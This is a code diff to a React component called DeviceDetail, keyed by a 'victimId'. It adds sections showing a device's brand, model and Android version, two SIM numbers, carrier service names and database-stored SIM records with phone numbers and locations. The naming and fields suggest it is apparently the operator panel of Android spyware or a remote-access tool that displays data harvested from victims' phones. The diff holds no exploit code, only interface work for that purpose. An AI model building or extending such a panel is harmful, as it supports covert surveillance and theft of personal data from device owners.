@@ -97,6 +97,7 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                 </CardHeader>
                 <CardContent>
                   <div className="space-y-6">
+                    {/* Device Information */}
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                       <div className="space-y-4">
                         <div className="flex justify-between">
@@ -120,10 +121,6 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                       </div>
                       <div className="space-y-4">
                         <div className="flex justify-between">
-                          <span className="text-muted-foreground">Android Version:</span>
-                          <Badge variant="outline">{device.AndroidVersion}</Badge>
-                        </div>
-                        <div className="flex justify-between">
                           <span className="text-muted-foreground">Apps Installed:</span>
                           <Badge variant="outline">{device.AppsInstalled}</Badge>
                         </div>
@@ -132,6 +129,31 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                           <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                             {device.Battery}
                           </Badge>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Device Brand, Model, and Android Version */}
+                    <div className="border-t pt-6">
+                      <h3 className="text-lg font-semibold mb-4">Device Specifications</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Brand:</span>
+                            <Badge variant="outline">{device.Brand || 'Unknown'}</Badge>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Model:</span>
+                            <span className="font-medium font-mono">{device.Model || 'Unknown'}</span>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Android Version:</span>
+                            <Badge variant="outline">{device.AndroidVersion || 'Unknown'}</Badge>
+                          </div>
                         </div>
                       </div>
                     </div>
@@ -193,39 +215,83 @@ export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
                   </CardTitle>
                 </CardHeader>
                 <CardContent>
-                  {loadingStates.sims ? (
-                    <div className="text-center py-8">
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
-                      <p className="text-sm text-muted-foreground">Loading SIM cards...</p>
-                    </div>
-                  ) : sims.length === 0 ? (
-                    <p className="text-muted-foreground text-center py-8">No SIM cards found</p>
-                  ) : (
-                    <div className="space-y-4">
-                      {sims.map((sim, idx) => (
-                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
-                          <div className="grid grid-cols-2 gap-4 text-sm">
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">Phone Number:</span>
-                              <span className="font-medium">{sim.PhoneNumber}</span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">Carrier:</span>
-                              <span className="font-medium">{sim.Carrier}</span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">Country:</span>
-                              <span className="font-medium">{sim.Country}</span>
-                            </div>
-                            <div className="flex justify-between">
-                              <span className="text-muted-foreground">State:</span>
-                              <span className="font-medium">{sim.State}</span>
-                            </div>
+                  <div className="space-y-6">
+                    {/* Device SIM Numbers */}
+                    <div className="space-y-3">
+                      <h3 className="text-lg font-semibold">Device SIM Numbers</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">SIM 1:</span>
+                            <span className="font-medium font-mono">{device.SimNumber1 || 'Unknown'}</span>
                           </div>
                         </div>
-                      ))}
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">SIM 2:</span>
+                            <span className="font-medium font-mono">{device.SimNumber2 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                  )}
+
+                    {/* Device Service Names */}
+                    <div className="space-y-3">
+                      <h3 className="text-lg font-semibold">Device Service Names</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Service 1:</span>
+                            <span className="font-medium">{device.ServiceName1 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Service 2:</span>
+                            <span className="font-medium">{device.ServiceName2 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* SIM Cards from Database */}
+                    <div className="space-y-3">
+                      <h3 className="text-lg font-semibold">SIM Cards from Database</h3>
+                      {loadingStates.sims ? (
+                        <div className="text-center py-8">
+                          <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
+                          <p className="text-sm text-muted-foreground">Loading SIM cards...</p>
+                        </div>
+                      ) : sims.length === 0 ? (
+                        <p className="text-muted-foreground text-center py-8">No SIM cards found in database</p>
+                      ) : (
+                        <div className="space-y-4">
+                          {sims.map((sim, idx) => (
+                            <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
+                              <div className="grid grid-cols-2 gap-4 text-sm">
+                                <div className="flex justify-between">
+                                  <span className="text-muted-foreground">Phone Number:</span>
+                                  <span className="font-medium">{sim.PhoneNumber}</span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-muted-foreground">Carrier:</span>
+                                  <span className="font-medium">{sim.Carrier}</span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-muted-foreground">Country:</span>
+                                  <span className="font-medium">{sim.Country}</span>
+                                </div>
+                                <div className="flex justify-between">
+                                  <span className="text-muted-foreground">State:</span>
+                                  <span className="font-medium">{sim.State}</span>
+                                </div>
+                              </div>
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  </div>
                 </CardContent>
               </Card>
             </TabsContent>
